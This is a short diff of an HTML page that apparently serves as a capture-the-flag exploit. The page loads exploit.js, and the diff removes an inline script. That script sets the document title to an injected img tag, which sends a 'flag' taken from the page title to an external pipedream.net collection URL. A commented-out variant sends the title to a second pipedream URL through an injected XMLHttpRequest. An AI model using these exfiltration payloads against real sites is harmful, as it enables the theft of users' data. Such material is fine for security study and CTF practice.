@@ -4,24 +4,6 @@
     <meta charset="UTF-8">
     <title>Initial Title</title>
     <script src="exploit.js"></script>
-    <script>
-        setTimeout(function() {
-            document.title = `<img src='https://enuhsfb8x1ni.x.pipedream.net/?flag=${document.title}' >`;
-        }, 2000);
-        // setTimeout(function() {
-        //     var scriptContent = `
-        //     document.addEventListener('DOMContentLoaded', function() {
-        //         var currentTitle = document.title;
-        //         var xhr = new XMLHttpRequest();
-        //         xhr.open('GET', 'https://enw1bjlx86tqn.x.pipedream.net/?flag=' + encodeURIComponent(currentTitle), true);
-        //         xhr.send();
-        //     });
-        //     `;
-    
-        //     document.title = `<script>${scriptContent}<//script>`;
-        // }, 2000);
-
-    </script>
 </head>
     <body>
         <h1>Page title will change in 2 seconds (check the tab's title).</h1>
